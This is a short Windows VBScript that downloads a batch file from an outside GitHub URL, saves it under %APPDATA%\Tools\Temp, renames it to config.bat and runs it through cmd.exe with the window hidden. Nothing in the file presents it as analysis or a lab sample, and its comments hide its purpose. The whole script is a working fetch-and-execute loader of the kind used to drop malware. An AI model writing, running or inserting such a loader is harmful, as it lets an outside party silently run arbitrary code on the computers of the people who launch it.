Option Explicit
Dim shell, fso, http, stream, folderPath, configFile, logFile, content
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
folderPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Tools\Temp"

' Create folder if it doesn't exist
If fso.FolderExists(folderPath) Then
    fso.DeleteFolder folderPath, True
End If
If Not fso.FolderExists(fso.GetParentFolderName(folderPath)) Then
    fso.CreateFolder fso.GetParentFolderName(folderPath)
End If
fso.CreateFolder folderPath

' Download file
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.Open "GET", "https://raw.githubusercontent.com/USATIKTOKER/Service/main/final.bat", False
http.Send

' Save content to file
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' Binary
stream.Open
stream.Write http.responseBody
stream.Position = 0
stream.Type = 2 ' Text
stream.Charset = "utf-8"
content = stream.ReadText
content = Replace(content, "****", "----")
stream.Position = 0
stream.SetEOS
stream.WriteText content
stream.SaveToFile folderPath & "\config.txt", 2

' Log content
Set logFile = fso.CreateTextFile(folderPath & "\log.txt", True)
logFile.WriteLine content
logFile.Close

' Rename and execute
If fso.FileExists(folderPath & "\config.bat") Then
    fso.DeleteFile folderPath & "\config.bat"
End If
fso.MoveFile folderPath & "\config.txt", folderPath & "\config.bat"
shell.Run "cmd.exe /c """ & folderPath & "\config.bat""", 0, False
